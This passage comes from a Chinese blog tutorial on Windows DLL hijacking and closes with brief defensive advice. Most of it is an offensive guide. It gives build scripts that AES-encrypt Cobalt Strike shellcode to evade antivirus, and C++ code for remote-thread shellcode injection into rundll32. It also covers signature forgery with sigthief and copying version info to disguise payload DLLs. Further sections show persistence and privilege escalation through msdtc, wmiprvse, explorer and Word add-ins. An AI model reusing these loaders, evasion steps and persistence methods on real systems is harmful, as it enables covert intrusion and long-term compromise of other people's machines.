src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/90f65e6ea8c43de399ff5075a5927b31.png"><br>这个程序在启动时会加载<code>QQMusicCommon.dll</code>，就可以针对该DLL进行劫持。另一种操作比较暴力，运行程序后尝试删除程序目录下文件，加载中的DLL因为句柄占用无法删除：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/fc1a53a9a4b70bfbe368c8c609c5f9fd.png"><br>之后就可以针对这些DLL进行劫持测试了。</p><h2 id="0x06-DLL-劫持的方法"><a href="#0x06-DLL-劫持的方法" class="headerlink" title="0x06 DLL 劫持的方法"></a>0x06 DLL 劫持的方法</h2><p>关于DLL劫持根据不同的方法可以进行细分，成功与否取决于应用程序如何配置以加载其所需的 DLL(这部分细分来写的原因在于DLL劫持的不同场景需要的条件不尽相同，包括到文件夹的权限、DLL代码编写、利用场景的限制、程序能否正常运行等)。从更深层的利用角度来说可能一些劫持方法如下：</p><h3 id="DLL-替换"><a href="#DLL-替换" class="headerlink" title="DLL 替换"></a>DLL 替换</h3><p>如果应用程序在加载DLL时没有检查DLL的合法性，可以将程序要加载的DLL替换成恶意 DLL ,然后通过DLL代理将程序的函数调用转发到原始DLL，从而确保程序所有功能保持不变。通过<code>Process Monitor</code> 监控Navicat加载了freeimage.dll，该DLL位于Navicat安装目录，对这个DLL进行替换测试：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/f28957f508f9c0c52ab4395310e4e9ed.png"><br>可使用<a href="https://github.com/kiwings/DLLHijacker">DLLHijacker</a> 脚本来对DLL函数进行转发生成VS项目(这个脚本用于测试会很方便，修改源码后直接编译就可以了)：</p><pre><code class="python">python3 DLLHijacker.py "D:\Program Files\PremiumSoft\Navicat Premium 15\freeimage.dll"</code></pre><p><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/36a706891b4f80812f3c166b54887f4c.png"><br>要转发到的真实DLL:<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/ba43a1268b2c9099347630a604b91d5d.png"><br>注入calc的shellcode到新进程rundll32.exe：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/038df633694e2a9fdcb8bca47ef76530.png"><br>启动后加载DLL触发calc执行：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/42b655d77cf2da598bde67fce82d25d5.png"></p><h3 id="DLL-搜索顺序劫持"><a href="#DLL-搜索顺序劫持" class="headerlink" title="DLL 搜索顺序劫持"></a>DLL 搜索顺序劫持</h3><p>在程序加载DLL的实际搜索位置之前放置DLL劫持搜索顺序，这些搜索位置还可以使用 在程序中使用<code>AddDllDirectory</code> 或 <code>SetDllDirectory</code>添加。根据 DLL 搜索顺序中可以植入恶意 DLL 的位置，漏洞大致属于以下三类之一(<a href="https://msrc-blog.microsoft.com/2018/04/04/triaging-a-dll-planting-vulnerability">对 DLL 植入漏洞进行分类</a>)： </p><ol><li>应用程序目录(App Dir) DLL 劫持。 </li><li>当前工作目录 (CWD) DLL 劫持。 </li><li>PATH目录 DLL 劫持。 </li></ol><p>比较常见的是程序使用一些API函数时，造成的DLL搜索顺序劫持，如下使用<code>version.dll</code>中的<code>GetFileVersionInfoSizeA</code>函数：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/778d040141db055ee4108fcb43a91bf3.png"><br>程序使用静态链接和动态链接两种方式执行函数的源码为：</p><pre><code class="cpp">#include &lt;iostream&gt;#include &lt;windows.h&gt;#pragma comment( lib, "Version.lib" )int Action(){    Sleep(3000);printf("\n使用动态链接:\n");    DWORD(__stdcall * GetFileVersionInfoX)(        LPCSTR  lptstrFilename,LPDWORD lpdwHandle);    DWORD dwHandle, sz;HMODULE DLL = LoadLibrary(L"version.dll");    if (DLL == NULL) {return 0;}    (FARPROC&amp;)GetFileVersionInfoX = GetProcAddress(DLL, "GetFileVersionInfoSizeA");    sz = GetFileVersionInfoX("C:\\windows\\system32\\cmd.exe", &amp;dwHandle);    printf("文件大小：%i", sz);    return 0;}int main(){printf("使用静态链接:\n");DWORD dwHandle, sz = GetFileVersionInfoSizeA("C:\\windows\\system32\\cmd.exe", &amp;dwHandle);    if (0 == sz){return 0;}printf("文件大小：%i", sz);Action();return 0;}</code></pre><p>注释LoadLibrary调用，程序在当前目录寻找<code>version.dll</code>，最后在加载32系统目录<code>version.dll</code>：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/ca853e1661395b37f2341af21917a4dc.png"><br>取消注释，将程序和带有函数转发的<code>version.dll</code>(加载后会弹窗)放入同一文件夹：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/fe7fe9ab52ac8872579e1edfd7882ae0.gif"></p><p>这样就可以对很对程序进行类似的劫持了，可用于权限维持、代码执行、权限提升。大多数时候程序会将自己安装在C盘，C盘的应用程序目录(App Dir)一般有系统的ACL保护，但如果程序对文件夹的权限比较开放也会造成漏洞。还有种情况就是程序加载一些系统不存在或者位置不正确的DLL程序，系统按照搜索顺序搜索时就会当前工作目录 (CWD)和<code>％PATH％</code>环境变量中寻找DLL进行加载。环境变量中的路径包含一些在C盘以外的类似Python、JAVA或其他安装程序的路径，这里的路径普通用户拥有写入权限，结合DLL劫持可以进行权限提升。这部分可以见后文的案例。</p><h3 id="DLL重定向"><a href="#DLL重定向" class="headerlink" title="DLL重定向"></a>DLL重定向</h3><p> 更改DLL搜索的位置，可以通过修改或添加<code>％PATH％</code>环境变量、修改清单文件<a href="https://docs.microsoft.com/en-gb/windows/win32/sbscs/application-manifests">.exe.manifest</a> 文件或重定向文件夹<a href="https://docs.microsoft.com/en-gb/windows/win32/dlls/dynamic-link-library-redirection">.exe.local</a>以包含恶意DLL。</p><p>开启DLL重定向需要创建一个新的注册表项(如果应用程序有清单文件，则忽略任何 <code>.local</code> 目录，命名规则为可执行文件名加上<code>.local</code> )：</p><pre><code class="cmd">reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options" /v DevOverrideEnable /t REG_DWORD /d 1 /f</code></pre><p><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/62aeba76f2e8029ff1100b9d13a97b7d.png"></p><h2 id="0x07-DLL-劫持武器化利用"><a href="#0x07-DLL-劫持武器化利用" class="headerlink" title="0x07 DLL 劫持武器化利用"></a>0x07 DLL 劫持武器化利用</h2><p>在DLL劫持过程中主要有两个步骤，一是编写执行功能的DLL，一是进行导出函数的代理。功能DLL一般用来进行shellcode注入，生成的DLL会很容易被安全软件标记为恶意，通过开源项目 <a href="https://github.com/slaeryan/AQUARMOURY/tree/master/Brownie">Brownie</a>对shellcode进行AES加密和资源封装，达到降低安全软件标记目的。对目标DLL进行导出函数转发时，使用开源项目<a href="https://github.com/monoxgas/Koppeling">Koppeling</a> 自适应处理，不再需要手动编译。</p><h3 id="项目配置"><a href="#项目配置" class="headerlink" title="项目配置"></a>项目配置</h3><p>获取到Brownie源码后，项目结构如下：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/71d28b10264355b673cc1b98828e02be.png"></p><p>在<code>compile64.bat</code>中需要进行一定的修改来适配环境，编译64位的程序，将对应的程序和脚本都换成64位：</p><pre><code class="python">@ECHO OFF:设置x64的编译环境call "D:\Program Files (x86)\Microsoft Visual Studio\2019\Community\VC\Auxiliary\Build\vcvars64.bat":加密shellcodepython Python\\aes.py Bin\\payload_x64.bin Bin\\payload_x64_encrypted.bin:编译资源文件"D:\Windows Kits\10\bin\10.0.18362.0\x64\rc.exe" Src\\Resource.rc:Microsoft 资源文件到 COFF 对象的转换cvtres /MACHINE:x64 /OUT:Src\\Resource.o Src\\Resource.res: /MT 多线程cl.exe /nologo /MT /Od /GS- /DNDEBUG /W0 /Tp Src\\DllProxyTemplate.cpp /link Src\\Resource.o Kernel32.lib ucrt.lib libvcruntime.lib libcmt.lib libcpmt.lib /DLL /NODEFAULTLIB /ENTRY:DllMain /OUT:Bin\\brownie_x64.dll /MACHINE:x64 /RELEASE /MERGE:_RDATA=.text /EMITPOGOPHASEINFO:清理文件del *.objdel Src\\Resource.odel Src\\Resource.res</code></pre><p>然后把<code>Bin\payload_x64.bin</code>换成CobaltStrike的x64的RAW类型shellcode，执行<code>compile64.bat</code>编译。编译完成后使用bat脚本调用Netclone在<code>brownie_x64.dll</code>中添加对<code>C:\Windows\System32\dui70.dll</code>导出函数的代理(<code>prepdll.bat dui70</code>)。最后复制输出文件到<code>LicensingUI</code>文件夹下执行：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/7d44f74f79247dacc38ec8b3e62610ca.png"></p><p>对于<code>Koppeling</code>的<code>Netclone</code>工具实现的原理和各种细节知识参考作者博客文章：<a href="https://www.netspi.com/blog/technical/adversary-simulation/adaptive-dll-hijacking/">自适应DLL劫持</a>。项目源码中有<code>Python</code>和<code>.Net</code>两个版本，<code>.Net</code>程序在<code>Brownie</code>项目中编译为了<code>Netclone.exe</code>，<code>Python</code>脚本效果也是一样的：</p><pre><code class="python">NetClone.exe  --target brownie_x64.dll --reference C:\windows\system32\version.dll -o version.dllpython3 PyClone.py brownie_x64.dll C:\windows\system32\dbghelp.dll -o dbghelp.dll</code></pre><p>在<code>Netclone</code>中针对带有符号修饰的DLL也进行了测试(DLLHijacker脚本处理时生成的项目会有语法错误)，也是可以正常处理的：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/d5811afdb5c9d7c79e42ac4c4182de83.png"></p><h3 id="项目优化"><a href="#项目优化" class="headerlink" title="项目优化"></a>项目优化</h3><p>优化有两个方面，一个是快速自动编译和生成，一个是代码性能和处理的一些优化。在编译过程中项目有只有对64位DLL的编译脚本，可以编写32位的：</p><pre><code class="python">@ECHO OFF:设置x86的编译环境@call "D:\Program Files (x86)\Microsoft Visual Studio\2019\Community\VC\Auxiliary\Build\vcvars32.bat":加密shellcodepython Python\\aes.py Bin\\payload_x86.bin Bin\\list.png Passw0rd!:编译资源文件"D:\Windows Kits\10\bin\10.0.18362.0\x86\rc.exe" Src\\Resource.rc:Microsoft 资源文件到 COFF 对象的转换cvtres /MACHINE:x86 /OUT:Src\\Resource.o Src\\Resource.res: /MT 多线程，cl.exe /nologo /MT /Od /GS- /DNDEBUG /W0 /Tp Src\\DllProxyTemplate.cpp /link Src\\Resource.o Kernel32.lib ucrt.lib libvcruntime.lib libcmt.lib libcpmt.lib /DLL /NODEFAULTLIB /ENTRY:DllMain /OUT:Bin\\brownie_x86.dll /MACHINE:x86 /RELEASE /MERGE:_RDATA=.text /EMITPOGOPHASEINFO:清理文件del *.objdel Src\\Resource.odel Src\\Resource.res</code></pre><p>这时候需要在<code>Resource.rc</code>文件中将打包的资源文件名统一：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/6f31fa1224523b222faf1caacdad4789.png"></p><p>要让DLL程序看起来是正常的DLL，继续添加版本等信息。这里在资源文件中补充版本信息时出现”未能完成操作,拒绝访问”，将资源文件涉及到的编辑窗口都关闭即可：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/171844e4637759a4f18ee94f4ebd40bb.png"></p><p>使用ResourceHacker工具获取到目标DLL版本信息后，在载荷DLL的资源信息中添加：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_12/b0197eddca4727b6f975573741e03ada.png"><br>完成后在DLL看到具有了相同的版本信息：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/459d0e7599aeb80a62a6c2eb1da4de23.png"></p><p>还可以通过<code>sigthief.py</code>伪造签名：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/821d726b56625292c08f5ef6c059227e.png"></p><p>在代码上的优化，主要是设置互斥锁防止DLL被加载后反复触发shellcode注入，DllMain代码如下：</p><pre><code class="c++">BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {    HANDLE threadHandle;    DWORD dwThread;    switch (fdwReason) {    case DLL_PROCESS_ATTACH:    {    // Init Code here        HANDLE Mutexlock = CreateMutex(NULL, FALSE, "helloword!");// 创建互斥量        if (GetLastError() == ERROR_ALREADY_EXISTS)            {CloseHandle(Mutexlock );Mutexlock = NULL;            }else{threadHandle = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)go, hinstDLL, 0, NULL);CloseHandle(threadHandle);}break;}    case DLL_THREAD_ATTACH:        // Thread-specific init code here        break;    case DLL_THREAD_DETACH:        // Thread-specific cleanup code here        break;    case DLL_PROCESS_DETACH:        // Cleanup code here        break;    }    // The return value is used for successful DLL_PROCESS_ATTACH    return TRUE;}</code></pre><p>对比两次DLL劫持后beacon返回情况，没有互斥锁时：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/d829277d717f60eb34099bb7e724dde9.png"></p><p>添加互斥锁后，再怎么操作都只返回首次beacon：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/0679d2166903017b5c7b4ff20456a809.png"></p><h3 id="目标程序要求"><a href="#目标程序要求" class="headerlink" title="目标程序要求"></a>目标程序要求</h3><p>在寻找和利用DLL劫持漏洞时，为了高效稳定、防御规避等需求，可以参考下列建议：</p><ol><li>主程序带有合法数字签名</li><li>程序启动后不退出、不报错</li><li>程序可以后台运行</li><li>被劫持的DLL不是系统级的</li><li>被劫持的DLL程序体积不能过大</li><li>触发漏洞后无感知，不影响正常使用</li><li>尽量使用进程迁移，否则beacon退出后程序可能也退出。</li></ol><h2 id="0x08-案例与分析"><a href="#0x08-案例与分析" class="headerlink" title="0x08 案例与分析"></a>0x08 案例与分析</h2><p>一般的，劫持资源类DLL(Satellite DLL)和文件替换来达到攻击效果的不会被接收，更多详情参考腾讯SRC：<a href="https://security.tencent.com/index.php/blog/msg/20">DLL劫持漏洞解析</a> ，在漏洞挖掘时主要还是关注搜索顺序劫持，特别是权限提升的情况，基本上挖掘到知名产品的DLL劫持后可以进行权限提升就可以申请CVE了。</p><h3 id="DLL劫持到权限提升"><a href="#DLL劫持到权限提升" class="headerlink" title="DLL劫持到权限提升"></a>DLL劫持到权限提升</h3><p><a href="https://blog.zsec.uk/nvidia-cve-2020/">CVE‑2020‑5980</a>是NVIDIA Windows GPU驱动程序在C盘的文件夹权限设置错误，导致普通用户可以写入DLL进行劫持后获得权限提升。在微星(MSI)Dragon_Center(龙中心)程序2.0.116.0版本中也存在提权漏洞，其服务<code>Mystic_Light_Service</code>子进程<code>LEDKeeper2.exe</code>会搜索<code>mscorjit.dll</code>进行加载，但是在其其安装目录下并没有该文件，并且系统目录中也不存在该文件(是.Net的链接库文件，在<code>C:\Windows\Microsoft.NET\Framework\</code>和<code>C:\Windows\WinSxS\</code>下存在)，就造成了在环境变量中进行搜索，可以如下配置Procmon：</p><pre><code class="python">Result contains NOT FOUNDUser contains SYSTEMPath ends with .dll</code></pre><p><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/414a465883d1ae5ce7b831167005f2ce.png"><br>编写DLL启动SYSTEM权限的CMD(通过Session0穿透的方式)和写入文件：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/5f6d679ca5a3f96b91c208f157b96965.png"><br>在PATH目录中放入DLL文件后重启服务，成功进行了权限提升：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/d766de84c87cb15ee82a2ee1142be1e8.png"></p><h3 id="当前目录劫持"><a href="#当前目录劫持" class="headerlink" title="当前目录劫持"></a>当前目录劫持</h3><p>当前工作目录 (CWD) DLL 劫持，也被称为相对路径 DLL 劫持。这种利用方式在各种攻击事件中屡见不鲜，主要手法是文件关联程序DLL劫持和“白+黑”利用。</p><h4 id="文件关联程序DLL劫持"><a href="#文件关联程序DLL劫持" class="headerlink" title="文件关联程序DLL劫持"></a>文件关联程序DLL劫持</h4><blockquote><p>文件关联就是将一种类型的文件与一个可以打开它的程序建立起一种依存关系。一个文件可以与多个应用程序发生关联。可以利用文件的“打开方式”进行关联选择。- 文件关联 - 百度百科</p></blockquote><p>利用这种文件关联，DLL劫持攻击就可能发生在双击打开图片文件时，在Windows10之前的系统照片查看器中就存在该问题，当照片查看器被设置为默认的图片程序时，双击打开图片时会进行搜索DLL以期望加载<code>lmagingEngine.dll</code>：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/803bf21f943aee3c9792714143b3eb84.png"><br>查看命令行参数估计是在<code>PhotoViewer.dll</code>中的导出函数<code>ImageView_Fullscreen</code>中没有指定加载目录，触发了DLL搜索：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/acf05fd43cdf2e873b4f09ae03ce1072.png"></p><p>其期望加载的DLL文件 <code>lmagingEngine.dll</code> 在<code>C:\Program Files&lt;(x86)&gt;\Windows Photo Viewer</code>中，触发DLL搜索后会搜索到当前目录，结果就导致了CWD劫持：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/4e202a51022664cee03fc13bc3396a48.gif"></p><h4 id="白加黑利用"><a href="#白加黑利用" class="headerlink" title="白加黑利用"></a>白加黑利用</h4><p>这种利用方式一般是将带有合法签名的应用程序(可以重命名)和恶意 DLL 一起复制到同一文件夹中，执行应用程序后在当前目录加载恶意DLL。就其使用方式而言，它与DLL代理执行有相似之处，但是这种情况利用稍微复杂一些，有可能没有合适的DLL进行函数的代理转发，需要对应用程序流程进行分析以保证执行后程序看起来像是正常的。这种利用方式一般会被称为白+黑利用，或者“自带 LOLbin”。以<code>WINWORD.EXE + WWLIB.DLL</code>白加黑为例，<code>WINWORD.EXE</code>是合法的签名文件，<code>WWLIB.DLL</code>是恶意DLL：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/c2a44f09a4289668e2b7fa8648d3e98d.png"><br>在实验过程中发现，如果只在DllMain中使用WinExec执行命令是可以成功的，但是在DllMain中想要通过创建远程线程来注入Cobat Strike的shellcode却无法上线：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/a40fdf16eef1b88cf3ec0d65327741c7.png"><br>这可能是因为<code>WINWORD.EXE</code>代码层面的原因，主进程执行完成就直接退出了，没有线程创建函数的生存时间。以下是通过两个程序加载DLL验证执行情况，其中<code>CmdUseDLL1.exe</code>主程序代码如下：</p><pre><code class="cpp">#include &lt;windows.h&gt;int main(){    HMODULE DLL = LoadLibrary(L"DllMain.dll");    return 0;}</code></pre><p><code>CmdUseDLL2.exe</code>代码如下,与CmdUseDLL1相比主函数中进行了Sleep：</p><pre><code class="c++">#include &lt;windows.h&gt;int main(){    HMODULE DLL = LoadLibrary(L"DllMain.dll");    Sleep(1024);    return 0;}</code></pre><p><code>DllMain.dll</code>核心代码如下，加载后创建线程执行<code>Inject_RemoteThread</code>：</p><pre><code class="c++">BOOL Inject_RemoteThread(){    printf("Inject_RemoteThread!\n");    WinExec("cmd.exe", 0);    }//in DllMain:case DLL_PROCESS_ATTACH:  // 进程加载DLL触发( LoadLibraryA)    {        HANDLE threadHandle;        threadHandle = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Inject_RemoteThread, hModule, 0, NULL);        CloseHandle(threadHandle);        break;}</code></pre><p>通过一个gif来观察过程：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/c7a3d5a2db53be45e61bdd50753763d2.gif"><br>可以看到没有延时的CmdUseDLL1程序直接就退出了，程序没有等待线程函数执行，所以要使得DllMain可以创建线程执行就需要主程序有一定的延时时间。如果说为了让CmdUseDLL1中的线程执行，通过<code>WaitForSingleObject</code>来等待也是不行的，这就涉及到了<strong>加载器锁机制</strong>(为了让线程等待执行，在DllMain中等待线程，会导致死锁)，更多内容查看文档 <a href="https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-best-practices">动态链接库最佳实践</a>。 再回到<code>WINWORD.EXE</code>无法成功进行shellcode注入问题，使用IDA分析主函数流程：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/5c0e9544017d6f94ada1fd43e8bd58db.png"><br>主函数调用完DLL导出函数就直接退出了，后续功能都交给DLL执行了。所以要成功让<code>WINWORD.EXE</code>完成预定行为可以直接在DllMain中进行远程线程注入或者DLL中导出函数FMain中进行远程线程注入，以下关键代码是直接在主线程中进行远程注入：</p><pre><code class="c++">...BOOL Inject_RemoteThread(LPSTR payload, SIZE_T payloadLen){    STARTUPINFO si;PROCESS_INFORMATION pi;LPVOID lpMalwareBaseAddr;LPVOID lpnewVictimBaseAddr;HANDLE hThread;      // DWORD dwExitCode;    BOOL bRet = FALSE;    lpMalwareBaseAddr = payload;    ZeroMemory(&amp;si, sizeof(si));    si.cb = sizeof(si);    ZeroMemory(&amp;pi, sizeof(pi));    if (CreateProcess("C:\\windows\\system32\\rundll32.exe", NULL, NULL, NULL,FALSE, CREATE_SUSPENDED, NULL, NULL, &amp;si, &amp;pi) == 0)    {  return bRet;  }    lpnewVictimBaseAddr = VirtualAllocEx(pi.hProcess, NULL, payloadLen + 1, MEM_COMMIT | MEM_RESERVE,PAGE_EXECUTE_READWRITE);    if (lpnewVictimBaseAddr == NULL)    { return bRet; }    WriteProcessMemory(pi.hProcess, lpnewVictimBaseAddr,(LPVOID)lpMalwareBaseAddr, payloadLen + 1, NULL);    hThread = CreateRemoteThread(pi.hProcess, 0, 0,(LPTHREAD_START_ROUTINE)lpnewVictimBaseAddr, NULL, 0, NULL);    return bRet;}BOOL APIENTRY DllMain( HMODULE hModule,                       DWORD  ul_reason_for_call,                       LPVOID lpReserved                     ){    switch (ul_reason_for_call)    {    case DLL_PROCESS_ATTACH:    {        Inject_RemoteThread(payload,payloadLen);        break;    }    case DLL_THREAD_ATTACH:    case DLL_THREAD_DETACH:    case DLL_PROCESS_DETACH:        break;    }    return TRUE;}</code></pre><p>在FMain中进行远程注入：</p><pre><code class="cpp">extern "C" __declspec(dllexport) int FMain(int a, int b, int c, int d);extern "C" __declspec(dllexport) void wdCommandDispatch();extern "C" __declspec(dllexport) void wdGetApplicationObject();int FMain(int a, int b, int c, int d) {    Inject_RemoteThread(payload,payloadLen);    return 1;}void wdCommandDispatch() {    return ;}void wdGetApplicationObject() {    return ;}</code></pre><p>最终的实现是在主流程中执行想要的操作而不使用线程，执行完成将流程返回即可：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/e5f99259c16fe6563f653dd06535cfa2.gif"></p><p>更多的LOLBIN类的系统程序，在 <a href="https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows">hijacking-dlls-in-windows-lists</a> 文章中针对这些程序进行了大量的DLL劫持测试，可以合理利用文章提供的受<a href="https://github.com/wietze/windows-dll-hijacking/blob/master/dll_hijacking_candidates.csv">DLL劫持影响的程序列表</a>。<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_12/fdf0252099f26de65cb18b4487d45eeb.png"><br>而这些程序大部分不具有持续运行的属性，所以劫持后需要在DLL的主线程中进行操作。持续运行属性就是指程序运行后可以在后台运行或持续一定时间，上文的 LicensingUI.exe 就属于持续运行程序，在hijacking-dlls-in-windows-lists表中的computerdefaults.exe就不属于，它执行后会创建线程启动设置，然后退出自身：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_12/0da334297ad0d9bfb925c370ea06d238.png"><br>对于这样的程序最好的利用方法就是创建子进程进行注入:<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_12/0b3aee7abec6c18fed22ef7f2ce37d0c.png"><br>子进程也可以选择一些带有数字签名的程序，这在后续执行的防御规避方面有一定效果：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_12/a8a66941db5b1237a622251710367ec5.png"></p><h3 id="权限维持"><a href="#权限维持" class="headerlink" title="权限维持"></a>权限维持</h3><p>使用DLL劫持漏洞在进行权限维持时比较便捷和稳定，而且大部分被利用的主程序都带有数字签名或者是Windows系统文件，所以在防御规避上也有优秀表现。在上文也对一些程序进行了DLL劫持测试，也对被劫持程序有一定要求，才能做到比较好的权限维持效果。接下来对不同的程序和情况，通过实例进行讲解。</p><h4 id="系统程序DLL劫持"><a href="#系统程序DLL劫持" class="headerlink" title="系统程序DLL劫持"></a>系统程序DLL劫持</h4><p>利用一些会随着系统启动或用户登录后启动的程序进行权限维持。对于C盘系统目录下的操作，都需要管理员甚至更高权限。对于随用户启动的程序，返回的都是用户权限，对于权限维持来说，已经是够用了。</p><h5 id="msdtc-exe"><a href="#msdtc-exe" class="headerlink" title="msdtc.exe"></a>msdtc.exe</h5><p>msdtc.exe是微软分布式传输协调程序，在域内主机上一般是作为服务自启动的，需要管理员权限操作：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_12/7f9d7759d125e02eaf2ce9b090d7b36e.png"><br>msdtc会加载注册表位置DLL文件：</p><pre><code>计算机\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\MSDTC\MTxOCI</code></pre><p><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_12/847ff49d956ce72a9764952a03f780e5.png"><br>这里的oci.dll在系统目录下并不存在，所以可以在msdtc.exe的相对目录中写入oci.dll，利用msdtc.exe加载。利用方式也非常简单，可以直接将beacon.dll改名为oci.dll放入C:\windows\system32\目录下直接加载即可(dll要与msdtc.exe相同位数)：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_12/7ed9d27777f8c0b320d3c704af0b8caf.png"><br>返回的msdtc进程返回权限是<code>nt authority\network service</code>，通过<code>sc config msdtc start= auto obj= LocalSystem</code>命令可修改服务启动的权限。这个程序的CobaltStrike利用插件已经开发完成，详见：<a href="https://github.com/yanghaoi/CobaltStrike_CNA">https://github.com/yanghaoi/CobaltStrike_CNA</a></p><h5 id="wmiprvse-exe"><a href="#wmiprvse-exe" class="headerlink" title="wmiprvse.exe"></a>wmiprvse.exe</h5><p>wmiprvse.exe是一个进行WMI的事件监控程序，会在系统启动后执行一段时间，程序会加载 <code>C:\windows\system32\wbem\WMICLNT.dll</code>动态链接库。但是该dll文件实际并不存在，所以也可以进行利用（通过Process Monitor发现）：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_12/157651a52a0fc0c1c29e1fd58fb86a64.png"><br>这个程序返回权限为SYSTEM，但是持续一段时间(大概两三分钟)后会退出：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_12/4c44517d45a69dffc9009f7955122665.png"></p><h5 id="explorer-exe"><a href="#explorer-exe" class="headerlink" title="explorer.exe"></a>explorer.exe</h5><p>explorer.exe是Windows程序管理器或者文件资源管理器，用户登录系统后自动执行，用于显示桌面等GUI功能。explorer同样会搜索加载一些不存在的DLL，如 <code>C:\Windows\linkinfo.dll</code>、<code>C:\windows\netutils.dll</code> 等，返回的是用户权限，dll写入后需要重启或注销后用户登录才生效。<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_12/ddf50aa9229b563e7ab8f5ecd702fc4d.png"></p><h4 id="常用软件DLL劫持"><a href="#常用软件DLL劫持" class="headerlink" title="常用软件DLL劫持"></a>常用软件DLL劫持</h4><p>常见软件的DLL劫持在上文对挖掘方法和一些案例也进行了介绍，如navicat、QQLive等程序。一般的利用尽量在获取目标系统安装软件版本后，本地测试好再去实际操作。获取系统安装的程序可以使用<code>wmic product get name,version</code>命令：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_12/6527c3d31b4c50d414cc421d225d5bef.png"><br>注册表查询<code>REG QUERY "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths"</code>等方式：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_12/833c4d2612d77c270bd58cdd5fa75883.png"></p><h4 id="Office-加载项"><a href="#Office-加载项" class="headerlink" title="Office-加载项"></a>Office-加载项</h4><p>这一项只是利用office的自动加载项进行权限维持，不算是DLL劫持的范畴。将编写好的dll文件扩展名该为.dll放置到<code>C:\Users\&lt;用户名&gt;\AppData\Roaming\Microsoft\Word\STARTUP</code>的加载项中，编写代码为：</p><pre><code class="c">#include "stdafx.h"BOOL APIENTRY DllMain( HANDLE hModule,                        DWORD  ul_reason_for_call,                        LPVOID lpReserved                     ){    if (ul_reason_for_call == DLL_PROCESS_ATTACH)    {        WinExec("CMD /K calc",SW_SHOWNORMAL);    }    return TRUE;}</code></pre><p>打开word后程序执行：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_12/3b93c49b7a5fba8474f5aa4e5ecf9d8c.gif"><br>在office软件的加载中心可以看到加载的扩展：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_12/d570e3933ff9f249f8473db0266e2e52.png"><br>也会发现有其他类型的加载项，比如百度云的COM加载项，如果有机会的话也可以尝试实现这一类型。</p><h2 id="0x09-DLL-劫持防御"><a href="#0x09-DLL-劫持防御" class="headerlink" title="0x09 DLL 劫持防御"></a>0x09 DLL 劫持防御</h2><p>开发过程中防御DLL劫持可以在DLL加载前进行下列一些处理：</p><ol><li>检查DLL文件签名</li><li>程序中校验DLL哈希</li><li>加载DLL时指定完整的路径</li><li>从搜索路径中删除安装目录、当前目录和PATH目录</li></ol><p>更多的资料还可以参考微软官方文档：<a href="https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-security">动态链接库安全</a> 以及 <a 